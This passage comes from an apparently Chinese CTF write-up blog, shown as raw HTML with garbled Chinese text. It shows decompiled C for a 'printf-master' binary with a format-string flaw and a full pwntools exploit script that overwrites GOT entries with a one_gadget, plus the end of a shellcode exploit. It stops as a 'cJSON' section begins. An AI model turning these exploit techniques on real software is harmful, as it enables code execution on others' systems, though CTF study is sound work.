class="line"><span class="string">push   rdx</span></span><br><span class="line"><span class="string">pop    rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br><span class="line">Add(<span class="string">f&#x27;add <span class="subst">&#123;calc_sh&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">Exec(<span class="string">b&#x27;0.3&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">0x20</span>)+asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="printf-master"><a href="#printf-master" class="headerlink" title="printf-master"></a>printf-master</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">myinit</span>();</span><br><span class="line">  <span class="built_in">gift</span>(a1, a2);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šæœ‰ä¸€ä¸ªgiftï¼Œé€‰æ‹©stackï¼Œheapï¼Œlibcçš„ä½å­—èŠ‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4080 == <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Get stack address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Get heap  address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Get libc  address&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. Get code  address&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    buf = ptr;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, ptr, <span class="number">4uLL</span>);</span><br><span class="line">    v0 = *buf;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, &amp;ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *buf &gt; <span class="number">0x34</span>u )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">switch</span> ( v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, &amp;puts);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, (&amp;savedregs - <span class="number">16</span>));</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Your gift: %#x\n&quot;</span>, buf);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">          _exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_4080 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åä¾¿æ˜¯ä¸»è¦éƒ¨åˆ†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, what&#x27;s your name?&quot;</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x101</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(buf, <span class="string">&#x27;$&#x27;</span>) )                       <span class="comment">// ä¸å…è®¸å‡ºç°$</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(buf + i) == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">      ++v0;                                     <span class="comment">// næœ€å¤šå‡ºç°4æ¬¡</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  ptr = <span class="number">0LL</span>;</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªä¸€æ¬¡æ€§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå‘ç°ä¸èƒ½å‡ºç°$ï¼Œå› æ­¤ä½¿ç”¨%cè¿›è¡Œå ä½ï¼Œå› æ­¤%cè¾“å‡ºçš„å†…å®¹çš„å­—èŠ‚æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä½¿ç”¨%cæ¥è¿›è¡Œå ä½å¯ä»¥æ›´å¥½çš„è¿›è¡Œè¦†ç›–</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ol><li>é¦–å…ˆå…ˆå°†printfçš„è¿”å›åœ°å€è¦†ç›–æˆstartåœ°å€ï¼ŒåŒæ—¶æ³„éœ²elfbaseï¼Œlibcbaseç­‰<ul><li>å®¹æ˜“å‡ºç°é—®é¢˜çš„åœ°æ–¹ï¼šç¬¬ä¸€æ˜¯vulnå‡½æ•°çš„é€€å‡ºæ˜¯é€šè¿‡exitçš„ï¼Œå› æ­¤åªèƒ½ç›´æ¥è¦†ç›–printfçš„è¿”å›åœ°å€äº†ï¼›ç¬¬äºŒæ˜¯è¦è¦†ç›–ä¸ºstartåœ°å€ï¼Œå› ä¸ºè¦æ¢å¤æ ˆå¸§ï¼Œä¸ç„¶ä¹‹åçš„è·³æ¿ä¼šæ— æ³•æ‰¾åˆ°</li></ul></li><li>ç„¶åå°†exit_gotè¦†ç›–ä¸ºstartåœ°å€ï¼Œå®ç°æ— é™æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>ä¹‹åä¾¿æ˜¯è¦†ç›–<code>___stack_chk_fail_got</code>ä¸º<code>one_gadget</code></li><li>æœ€åå°†<code>exit_got</code>è¦†ç›–ä¸º<code>___stack_chk_fail</code>å³å¯</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>:p.recvall(timeout=time)</span><br><span class="line">u7f =<span class="keyword">lambda</span>:u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=run()</span><br><span class="line">        sa(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>,tbs(<span class="number">1</span>))</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">        <span class="comment">#ç¬¬ä¸€æ­¥</span></span><br><span class="line">        payload=<span class="string">b&#x27;%c&#x27;</span>*<span class="number">10</span>+<span class="string">b&#x27;%p&#x27;</span>+<span class="string">b&#x27;%c&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;%p&#x27;</span>+fmt(<span class="string">&#x27;%&#123;stack-0x29-0x18&#125;c&#x27;</span>)+<span class="string">b&#x27;%hn&#x27;</span>+<span class="string">b&#x27;%c&#x27;</span>*<span class="number">26</span>+fmt(<span class="string">&#x27;%&#123;0xa1b0-stack-26+0x18&#125;c&#x27;</span>)+<span class="string">b&#x27;%hn&#x27;</span></span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        sa(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        elf_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x16bd</span></span><br><span class="line">        leak(<span class="string">&quot;elf_base&quot;</span>,elf_base)</span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        libc_base=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">        <span class="comment"># leak(&#x27;code&#x27;,code)</span></span><br><span class="line">        leak(<span class="string">&#x27;libc&#x27;</span>,libc_base)</span><br><span class="line">        system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        og=[<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">        execve=libc_base+og[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        exit_got=elf_base+<span class="number">0x4020</span></span><br><span class="line">        free_got=elf_base+<span class="number">0x4018</span></span><br><span class="line">        <span class="comment"># ru(b&#x27;your name?\n&#x27;)</span></span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        leak(<span class="string">&quot;exit_got&quot;</span>,exit_got)</span><br><span class="line"><span class="comment"># ç¬¬äºŒæ­¥ è¦†ç›–exit_got ä¸º start</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload =b&#x27;%c&#x27;*(29-2)+fmt(&#x27;%&#123;(exit_got &amp; 0xffff)-27 &#125;c&#x27;)+b&#x27;%hn&#x27;</span></span><br><span class="line">        <span class="comment"># payload+=b&#x27;%c&#x27;*(58-2-29)+fmt(&#x27;%&#123;0xa1b0 - 0xa020 + 27-0x2&#125;c&#x27;)+b&#x27;%hn&#x27;</span></span><br><span class="line">        target=(elf_base+<span class="number">0x4020</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((elf_base+<span class="number">0x11B0</span>)&amp;<span class="number">0xffff</span>)+(<span class="number">0x10000</span>-target)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x142</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">58</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2-<span class="number">0x129</span>&#125;</span>c%hn&#x27;</span> </span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        sa(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        system_add=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        stack_chk_fail_got=elf_base+<span class="number">0x4030</span></span><br><span class="line">        target=(stack_chk_fail_got)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=(execve)&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_1&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_1&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload) </span><br><span class="line">        debug()</span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(stack_chk_fail_got+<span class="number">2</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((execve&gt;&gt;(<span class="number">8</span>*<span class="number">2</span>)))&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_2&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_2&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>+<span class="number">1</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload) </span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(stack_chk_fail_got+<span class="number">4</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=((execve&gt;&gt;(<span class="number">8</span>*<span class="number">4</span>)))&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_3&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;target):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;stack_chk_fail_got_3&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;what&#x27;</span>,timeout=<span class="number">2</span>)</span><br><span class="line">        </span><br><span class="line">        p0=<span class="string">&#x27;$29&#x27;</span><span class="comment">#17</span></span><br><span class="line">        p1=<span class="string">&#x27;$64&#x27;</span><span class="comment">#3a</span></span><br><span class="line">        target=(elf_base+<span class="number">0x4020</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        target2=(elf_base+<span class="number">0x1130</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exit_got&quot;</span>,<span class="built_in">hex</span>(target2))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(target2&lt;(target+<span class="number">361</span>+<span class="number">0x19</span>)):target2=target2+(<span class="number">0x10000</span>-target-<span class="number">361</span>-<span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>: target2=target2-target-<span class="number">361</span>-<span class="number">0x19</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exit_got&quot;</span>,<span class="built_in">hex</span>(target),<span class="built_in">hex</span>(target2))</span><br><span class="line">        payload=<span class="string">f&#x27;%p&#x27;</span>*(<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target-<span class="number">0x155</span>+<span class="number">1</span>&#125;</span>c%hn&#x27;</span></span><br><span class="line">        payload+=<span class="string">&#x27;%p&#x27;</span>*(<span class="number">64</span>-<span class="number">29</span>-<span class="number">2</span>)+<span class="string">f&#x27;%<span class="subst">&#123;target2&#125;</span>c%hn&#x27;</span></span><br><span class="line">        p.sendline(payload)  </span><br><span class="line">        <span class="comment"># debug()</span></span><br><span class="line">        irt()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># irt()</span></span><br></pre></td></tr></table></figure><p>ç¾¡æ…•æ¯”èµ›å†™çš„å‡ºæ¥çš„å¸ˆå‚…ä»¬ï¼Œç®€ç›´å¤ªå¼ºäº†ï¼ï¼</p><h1 id="cJSON"><a href="#cJSON" class="headerlink" title="cJSON"></a>cJSON</h1><p>ä¸€ä¸ªå¾ˆæ¶å¿ƒçš„é¢˜ç›®ï¼Œå¤§éƒ¨åˆ†çš„ç¨‹åºæ˜¯æ²¡æœ‰ç”¨å¤„çš„&#x2F;(ã„’oã„’)&#x2F;~~ï¼Œæ¯”èµ›çš„æ—¶å€™æˆ‘å±…ç„¶æ˜¯ä»å¤´é€†åˆ°å°¾ï¼Œä¹Ÿæ˜¯é•¿è®°æ€§äº†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 